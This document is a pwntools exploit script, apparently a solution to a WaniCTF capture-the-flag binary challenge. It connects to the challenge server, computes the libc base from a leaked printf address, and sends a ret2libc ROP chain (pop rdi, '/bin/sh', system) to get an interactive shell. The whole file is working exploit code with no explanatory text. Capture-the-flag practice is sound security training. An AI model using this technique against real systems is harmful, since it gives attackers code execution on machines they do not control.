#!/usr/bin/python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x14A3

        c
        ''')
        input()


if args.REMOTE:
    p = remote('chal-lz56g6.wanictf.org', 9005)
else:
    p = process(exe.path)
# GDB()

p.recvuntil(b'= ')
libc.address = int(p.recvline(keepends=False), 16) - libc.sym.printf
info("libc.address: " + hex(libc.address))
# sl(b'a'*(224+8*17))
for i in range(3):
    sl(b'wan')
    sl(b'1')
    sl(b'1')
pop_rdi = libc.address + 0x000000000010f75b
pa = flat(
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
)
sl(pa)
sl(b'a')
sl(b'a')

p.interactive()
